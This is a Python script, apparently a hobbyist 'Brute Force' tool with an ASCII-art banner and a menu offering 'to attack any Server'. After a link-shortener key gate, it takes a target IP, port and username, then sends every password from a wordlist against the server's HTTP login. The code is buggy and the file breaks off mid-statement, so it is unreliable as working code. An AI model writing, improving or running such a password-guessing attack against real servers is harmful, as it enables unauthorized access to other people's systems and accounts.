import os
import time




os.system("cls") 


COLORS = {\
"black":"\u001b[30;1m",
"red": "\u001b[31;1m",
"green":"\u001b[32m",
"yellow":"\u001b[33;1m",
"blue":"\u001b[34;1m",
"magenta":"\u001b[35m",
"cyan": "\u001b[36m",
"white":"\u001b[37m",
"yellow-background":"\u001b[43m",
"black-background":"\u001b[40m",
"cyan-background":"\u001b[46;1m",
}



def colorText(text):
    for color in COLORS:
        text = text.replace("[[" + color + "]]", COLORS[color])
    return text






import requests  
import time
import random


check = 0 



keys = [
	{
		"link": "http://cutpaid.com/ERh0GPW",	
		"key": '34243242354354'
	},
	{
		"link": "http://cutpaid.com/mybXiF",
		"key": '432432534534534'
	},
	{
		"link": "http://cutpaid.com/XqIqja",
		"key": '42345534534'
	},
    {
		"link": "http://cutpaid.com/OjVevC36",
		"key": '56785686769788977'
	},
    {
		"link": "http://cutpaid.com/TOBjAcwF",
		"key": '564678fds943580edsf093'
	},
    {
		"link": "http://cutpaid.com/ia8kS9N",
		"key": '324328rsdfs239579fs34'
	}
]


nextstep = 0

def AttackbyHackers (number):
    n= random.choice(keys)
    print(colorText("[[yellow]][[[red]]~[[yellow]]] [[yellow]]" + n["link"] + ""))
    keyss = input(colorText("[[yellow]][[[red]]~[[yellow]]]  [[yellow]]Enter the key to Use the tool:"))
    for i ,m in enumerate(keys):
            if m['key'] == keyss:
                print(colorText("[[yellow]][[[red]]~[[yellow]]]  [[yellow]]the key  enter is correct "))
                nextstep = 1
                if nextstep == 1:
                  Username =  input(colorText("[[yellow]][[[red]]~[[yellow]]] [[yellow]]Enter the UserName:"))
                  ipserver = input(colorText("[[yellow]][[[red]]~[[yellow]]]  [[yellow]]Enter the ip server:"))
                  portserver = input(colorText("[[yellow]][[[red]]~[[yellow]]] [[yellow]]Enter the port server(must be HTTP Port):"))
                  wordlist = open("wordlist.txt",'r').readlines()
                for line in wordlist:
                      time.sleep(7)
                      print(colorText("[[yellow]][[[red]]~[[yellow]]] [[yellow]]put all data we have"))
                      keylogin = line.strip()
                      http_username = Username
                      http_password = keylogin
                      payload = {
                      'USER': Username,
                      'PASSWORD': keylogin,
                         }
                      time.sleep(3)
                      print(colorText("[[yellow]][[[red]]~[[yellow]]] [[yellow]]tested the passworld " + keylogin + ""))
                      time.sleep(2)
                      connect = requests.post("http://"+ ipserver + ":" + portserver + "/" , data=payload,auth = (http_username, http_password) )
                      print(colorText("[[yellow]][[[red]]~[[yellow]]] [[yellow]]try to connect again"))
                      time.sleep(7)
                if connect.status_code == 200:
                    print(colorText("[[yellow]][[[red]]~[[yellow]]] [[yellow]]passworld was cracked : [[red]]" + keylogin + ""))
                break







print(colorText('''
[[white]]
────────────█████████
──────────███║║║║║║║███
─────────█║║║║║║║║║║║║║█
────────█║║║║███████║║║║█
───────█║║║║██─────██║║║║█
──────█║║║║██───────██║║║║█
─────█║║║║██─────────██║║║║█
─────█║║║██───────────██║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
────███████───────────███████
───██║║║║║║██────────██║║║║║██
──██║║║║║║║║██──────██║║║║║║║██
─██║║║║║║║║║║██───██║║║║║║║║║║██
██║║║║║║║║║║║║█████║║║║║║║║║║║║██
█║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█
█║║║║║║║║║║║║║█████║║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
██║║║║║║║║║║║█░░░░░█║║║║║║║║║║║██
██║║║║║║║║║║║║█░░░█║║║║║║║║║║║║██
─██║║║║║║║║║║║█░░░█║║║║║║║║║║║██
──██║║║║║║║║║║█░░░█║║║║║║║║║║██
───██║║║║║║║║║█░░░█║║║║║║║║║██
────██║║║║║║║║█████║║║║║║║║██
─────██║║║║║║║║███║║║║║║║║██
──────██║║║║║║║║║║║║║║║║║██
───────██║║║║║║║║║║║║║║║██
────────██║║║║║║║║║║║║║██
─────────██║║║║║║║║║║║██
──────────██║║║║║║║║║██
───────────██║║║║║║║██
────────────██║║║║║██
─────────────██║║║██
──────────────██║██
───────────────███
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀

'''))


print(colorText('''

[[red]]           
________              _____           ________                             ______              _____________                 _________   ______         
___  __ )__________  ___  /_____      ___  __/_______________________      ___  /______  __    ___    |__  /________ ______________  /   ___  /_____  __
__  __  |_  ___/  / / /  __/  _ \     __  /_ _  __ \_  ___/  ___/  _ \     __  __ \_  / / /    __  /| |_  __ \_  __ `__ \  _ \  __  /    __  / __  / / /
_  /_/ /_  /   / /_/ // /_ /  __/     _  __/ / /_/ /  /   / /__ /  __/     _  /_/ /  /_/ /     _  ___ |  / / /  / / / / /  __/ /_/ /     _  /___  /_/ / 
/_____/ /_/    \__,_/ \__/ \___/      /_/    \____//_/    \___/ \___/      /_.___/_\__, /      /_/  |_/_/ /_//_/ /_/ /_/\___/\__,_/      /_____/\__, /  
                                                                                  /____/                                                       /____/   
                                                                                                                                                        
                                                                                                                                                        
                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                        
                                                                                             
'''))


print(colorText('''
[[blue]]   
  ====================================================
  = 1: to attack any Server !                         =
  = 2: to Show all Servers Was is Attack by Hackers   =
  ====================================================



'''))

userinput = input(colorText("[[yellow]][[[red]]~[[yellow]]]  [[yellow]]>User>> : [[blue]]"))
while userinput == "1":
    AttackbyHackers(1)




while userinput == "2":
